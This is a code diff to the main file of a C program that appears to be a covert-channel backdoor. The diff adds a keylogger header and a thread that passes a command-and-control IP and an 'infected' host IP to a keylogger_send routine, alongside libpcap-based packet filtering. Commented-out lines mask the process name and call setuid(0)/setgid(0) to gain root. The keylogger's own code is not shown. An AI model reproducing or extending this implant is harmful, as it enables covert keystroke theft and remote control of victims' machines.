@@ -4,6 +4,7 @@
 #include "../src/covert_wrappers.h"
 #include "../src/inotify.h"
 #include "../src/libpcap.h"
+#include "../src/keylogger.h"
 
 static void print_usage(void) {
     puts ("Usage options: \n"
@@ -22,15 +23,14 @@ static struct option long_options[] = {
     {0,         0,                  0,  0 }
 };
 
-
 int main(int argc, char **argv){
     //strcpy(argv[0], MASK);
     //change the UID/GID to 0 to raise privs
     //setuid(0);
     //setgid(0);
     int arg;
-    char targetip[BUFSIZ];
-    char localip[BUFSIZ];
+    char cnc_ip[BUFSIZ];
+    char local_ip[BUFSIZ];
     struct filter Filter;
     char pcapfilter[BUFSIZ];
 
@@ -54,20 +54,32 @@ int main(int argc, char **argv){
                 printf("Using NIC: %s\n", nic);*/
                 break;
             case 1:
-                strncpy(targetip, optarg, BUFSIZ);
-                printf("TARGET IP: %s\n", targetip);
+                strncpy(cnc_ip, optarg, BUFSIZ);
+                printf("TARGET IP: %s\n", cnc_ip);
                 break;
             case 2:
-                strncpy(localip, optarg, BUFSIZ);
-                printf("LOCAL IP: %s\n", localip);
+                strncpy(local_ip, optarg, BUFSIZ);
+                printf("LOCAL IP: %s\n", local_ip);
                 break;
             default: /*  '?' */
                 print_usage();
                 exit(1);
         }
     }
-    printf("%s\n",targetip);
-    Filter = InitFilter(targetip,localip, true);
+
+    //keylogger thread
+    keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
+    strncpy(keylogger_args->cnc_ip, cnc_ip, BUFSIZ);
+    strncpy(keylogger_args->infected_ip, local_ip, BUFSIZ);
+    pthread_t keylogger_thread; //create a thread
+    pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);
+
+
+    //TESTING
+    //pthread_join(keylogger_thread, NULL);
+
+    printf("%s\n",cnc_ip);
+    Filter = InitFilter(cnc_ip,local_ip, true);
     PrintFilter(Filter);
     CreateFilter(Filter, pcapfilter);
     printf("Filter: %s\n",pcapfilter);
@@ -77,6 +89,7 @@ int main(int argc, char **argv){
     covert_udp_send("192.168.0.118", "192.168.0.115", 8506, 8506, buf, 2);
     covert_udp_send("192.168.0.118", "192.168.0.115", 8507, 8507, buf, 2);*/
     Packetcapture(pcapfilter,Filter,true);
-    exit(1);
+
+    pthread_cancel(keylogger_thread);
     return 0;
 }
